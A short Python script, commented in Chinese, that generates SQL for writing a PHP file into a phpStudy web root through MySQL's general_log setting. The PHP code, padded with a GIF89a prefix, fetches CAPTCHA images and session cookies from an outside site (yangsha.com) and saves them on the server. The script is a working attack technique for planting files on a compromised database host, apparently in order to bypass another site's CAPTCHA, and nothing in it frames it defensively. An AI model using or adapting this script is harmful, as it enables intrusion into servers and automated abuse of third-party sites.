#!/usr/bin/env python3
"""gen_getcap.py - 生成getcap.php(81.70下载yangsha验证码到web目录)"""
body = '<?php $ch=curl_init("http://www.yangsha.com/GetCode.asp?t=".time());curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_COOKIEJAR,"C:/phpStudy/WWW/ys_c.txt");curl_setopt($ch,CURLOPT_COOKIEFILE,"C:/phpStudy/WWW/ys_c.txt");curl_setopt($ch,CURLOPT_TIMEOUT,12);$r=curl_exec($ch);file_put_contents("C:/phpStudy/WWW/ys_cap.jpg",$r);echo "SAVED:".strlen($r);?>'

# 无单引号检查
assert "'" not in body.replace("php://input", "")
sql = []
sql.append("SET GLOBAL general_log=OFF;")
sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/getcap.php';")
sql.append("SET GLOBAL general_log=ON;")
sql.append("SELECT 'GIF89a%s//'" % body)
sql.append("SET GLOBAL general_log=OFF;")
with open('/tmp/getcap.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('ready, len:', len(body))
